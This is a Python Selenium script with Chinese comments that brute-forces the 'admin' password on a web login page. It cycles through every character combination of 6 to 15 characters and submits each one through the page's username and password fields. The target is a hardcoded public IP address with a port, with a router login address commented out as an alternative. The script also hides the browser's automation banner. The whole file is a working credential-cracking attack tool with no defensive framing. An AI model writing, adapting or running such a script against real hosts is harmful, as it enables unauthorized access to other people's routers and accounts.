

from selenium import webdriver
import time
import itertools


# 装饰器 计算时间
def time_out(a_func):
    def clocked(*args, **kwargs):
        start = time.time()
        result = a_func(*args, **kwargs)
        end = time.time()
        print("程序：" + a_func.__name__, "    运行时间：" + str(end - start))
        return result

    return clocked


# 请求方法
@time_out
def get(driver, url, count, use):
    driver.get(url)
    driver.implicitly_wait(10)
    """
    数字 + 小写字母 + 大写字母 + 符号
    :return:
    """
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*?_-."
    for a in range(6,16):
        for c in itertools.product(chars, repeat=a):
            count += 1
            password = ''.join(c)
            driver.implicitly_wait(10)

            print("................................开始自动填充密码 爆破中.......................................")
            # 用户名 admin
            user = driver.find_element_by_id("txtUserName")
            user.click()
            user.clear()
            user.send_keys(use)

            # 密码爆破开始
            paswd = driver.find_element_by_id("txtPwd")
            paswd.click()
            paswd.clear()
            # 页面输入密码
            paswd.send_keys(password)

            # 网页 js 密码注入
            # js_code = 'document.getElementById("lgPwd").innerHTML="{}";'.format(password)
            # print(js_code)
            # driver.execute_script(js_code)

            # 点击登陆按钮
            driver.find_element_by_id("btnLogin").click()
            driver.implicitly_wait(15)


            # 关闭密码错误提示框
            # driver.find_element_by_css_selector('#pop_163370375869635439 > div.popBox > div.ttBox > a').click()

            # 刷新界面
            driver.refresh()
            print('*************** 第 ' + str(count) + ' 组密码 ***************')
            print("当前 ",a,"  位密码测试")
            print("用户名：",use)
            print("密码：",password)






# 程序入口
if __name__ == '__main__':
    # 标识 当前目录
    # url = "http://tplogin.cn/"
    url = "http://183.230.147.88:8081/"
    use = 'admin'
    count = 0

    # 去除浏览器被控  字样
    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ['enable-automation'])
    options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome(options=options)  # driver = webdriver.Chrome(executable_path=r'D:PATHchromedriver.exe')?

    get(driver, url,count,use)
